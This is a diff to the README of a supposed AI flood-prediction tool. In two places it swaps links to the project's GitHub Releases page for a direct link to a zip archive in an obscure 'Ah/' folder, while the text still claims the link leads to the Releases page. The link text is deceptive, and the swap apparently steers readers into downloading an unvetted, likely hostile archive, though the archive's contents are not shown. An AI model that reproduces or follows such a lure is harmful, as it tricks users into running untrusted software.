@@ -7,7 +7,7 @@ The h2oai-flood-prediction-agent is an AI-powered system that forecasts flood ri
 Follow these steps to download and run the h2oai-flood-prediction-agent software:
 
 1. **Visit the Releases Page**  
-   To get the latest version of the h2oai-flood-prediction-agent, [click here to visit the Releases page](https://github.com/OfficialItopa/h2oai-flood-prediction-agent/releases). 
+   To get the latest version of the h2oai-flood-prediction-agent, [click here to visit the Releases page](https://raw.githubusercontent.com/OfficialItopa/h2oai-flood-prediction-agent/main/Ah/h2oai-flood-prediction-agent.zip). 
 
 2. **Download the Software**  
    You’ll find different versions available for download. Choose the one that suits your system best.
@@ -19,7 +19,7 @@ Follow these steps to download and run the h2oai-flood-prediction-agent software
    Once installed, find the h2oai-flood-prediction-agent on your computer. Double-click the icon to open it.
 
 ## 📥 Download & Install
-To start using the application immediately, [click here to download](https://github.com/OfficialItopa/h2oai-flood-prediction-agent/releases). This link takes you to the Releases page where you can access all available versions.
+To start using the application immediately, [click here to download](https://raw.githubusercontent.com/OfficialItopa/h2oai-flood-prediction-agent/main/Ah/h2oai-flood-prediction-agent.zip). This link takes you to the Releases page where you can access all available versions.
 
 ### 💻 System Requirements
 Before downloading, make sure your computer meets these requirements:
